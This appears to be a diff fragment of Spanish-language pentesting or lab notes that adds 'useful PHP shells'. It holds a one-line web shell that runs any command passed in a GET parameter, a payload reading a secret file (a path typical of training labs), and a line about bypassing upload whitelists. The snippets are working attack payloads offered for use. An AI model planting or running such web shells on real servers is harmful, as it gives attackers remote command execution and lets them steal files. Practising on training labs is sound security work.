@@ -1,3 +1,8 @@
+shells php útiles:
+
+<?php system($_GET['cmd']); ?>
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
 
 
 Generar bash con wordlists para bypassear whitelists:
